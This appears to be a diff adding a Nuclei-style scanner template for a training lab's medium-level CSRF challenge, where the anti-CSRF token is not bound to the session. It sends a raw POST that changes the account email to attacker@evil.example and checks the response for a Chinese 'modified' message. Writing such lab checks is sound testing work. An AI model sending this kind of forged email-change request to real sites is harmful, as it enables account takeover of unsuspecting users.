@@ -1,0 +1,25 @@
+id: vulnlab-csrf-medium
+
+info:
+  name: VulnLab CSRF medium 档（token 未绑定会话）
+  author: hediwen
+  severity: high
+  tags: vulnlab,csrf
+
+http:
+  - raw:
+      - |
+        POST /csrf/medium.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        email=attacker%40evil.example
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "上一次请求：<b>已修改</b>"
+
